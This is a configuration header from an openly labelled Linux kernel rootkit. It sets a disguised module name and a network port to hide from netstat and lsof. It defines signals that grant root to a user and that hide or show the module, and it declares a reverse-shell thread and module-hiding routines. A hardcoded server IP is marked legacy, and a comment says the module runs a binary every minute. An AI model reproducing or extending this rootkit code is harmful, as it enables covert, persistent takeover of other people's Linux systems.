/*
 ██▀███  ▓█████  ▄▄▄▄    ▄▄▄▄   ▓█████  ██▓     ██▓ ▒█████   ███▄    █ 
▓██ ▒ ██▒▓█   ▀ ▓█████▄ ▓█████▄ ▓█   ▀ ▓██▒    ▓██▒▒██▒  ██▒ ██ ▀█   █ 
▓██ ░▄█ ▒▒███   ▒██▒ ▄██▒██▒ ▄██▒███   ▒██░    ▒██▒▒██░  ██▒▓██  ▀█ ██▒
▒██▀▀█▄  ▒▓█  ▄ ▒██░█▀  ▒██░█▀  ▒▓█  ▄ ▒██░    ░██░▒██   ██░▓██▒  ▐▌██▒
░██▓ ▒██▒░▒████▒░▓█  ▀█▓░▓█  ▀█▓░▒████▒░██████▒░██░░ ████▓▒░▒██░   ▓██░
░ ▒▓ ░▒▓░░░ ▒░ ░░▒▓███▀▒░▒▓███▀▒░░ ▒░ ░░ ▒░▓  ░░▓  ░ ▒░▒░▒░ ░ ▒░   ▒ ▒ 
  ░▒ ░ ▒░ ░ ░  ░▒░▒   ░ ▒░▒   ░  ░ ░  ░░ ░ ▒  ░ ▒ ░  ░ ▒ ▒░ ░ ░░   ░ ▒░
  ░░   ░    ░    ░    ░  ░    ░    ░     ░ ░    ▒ ░░ ░ ░ ▒     ░   ░ ░ 
   ░        ░  ░ ░       ░         ░  ░    ░  ░ ░      ░ ░           ░ 
                      ░       ░                                                                                                                                                      
*/
#ifndef CONFIG_H
#define CONFIG_H
#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>
#include <net/sock.h>
#include <linux/ip.h>
#include <linux/inet.h>
#include <linux/skbuff.h>

#include "hooks.h"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("br0sck");
MODULE_DESCRIPTION("Ring 0 Rootkit for Linux Kernels x86/x86_64 5.x/6.x");

//=====================[YOU CAN CHANGE THIS]========================//
#define MODULENAME "gnu_rapl_header"      // if you change the file name, you must change it here too
#define HIDE_PORT 1234              // TCP and UDP port to hide (only netstat & lsof)
//==========[PROGRAM EXECUTION]=========//
#define YOUR_SRV_IP "150.241.91.206"     // Legacy - not used anymore
#define YOUR_SRV_PORT 5555          // Legacy - not used anymore
// Now executes /usr/src/droplet/linux-gnu-header every 1 minute
//======================================//
#define SIGUSR1 10                  // user2root signal
#define SIGUSR2 12                  // hide/show module signal
//==================================================================//

#define TRUE 1
#define FALSE 0

bool isModuleHidden = FALSE;
static struct list_head *modPrevious;
static struct list_head *modKOBJPrevious;

void hideModule(void);
void showModule(void);

static struct task_struct *revshell_thread;

#endif // !CONFIG_H
